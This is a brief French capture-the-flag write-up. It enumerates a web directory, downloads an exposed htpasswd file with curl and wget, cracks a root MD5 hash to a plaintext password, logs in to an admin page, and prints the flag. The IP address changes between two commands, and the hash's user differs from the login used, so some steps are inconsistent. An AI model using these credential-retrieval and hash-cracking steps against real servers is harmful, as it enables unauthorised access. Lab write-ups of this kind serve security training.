Lors de l’énumération du serveur, on trouve un répertoire accessible :
http://192.168.1.47/whatever/

En listant son contenu :
curl -s http://192.168.1.47/whatever/ | grep href

On voit :
htpasswd

On télécharge le fichier :
wget http://10.74.3.92/whatever/htpasswd

root:437394baff5aa33daa618be47b75cb49


<img width="629" height="570" alt="image" src="https://github.com/user-attachments/assets/46e18927-cc14-480c-abf7-3a4380230692" />


Le hash ressemble à une empreinte MD5

437394baff5aa33daa618be47b75cb49 : qwerty123@

On obtient le mot de passe : qwerty123@

On se connecte à la page admin 
username : admin
password : qwerty123@


<img width="726" height="739" alt="image" src="https://github.com/user-attachments/assets/288a341b-d412-4b68-8f11-f6aee9c20d86" />



The flag is : d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
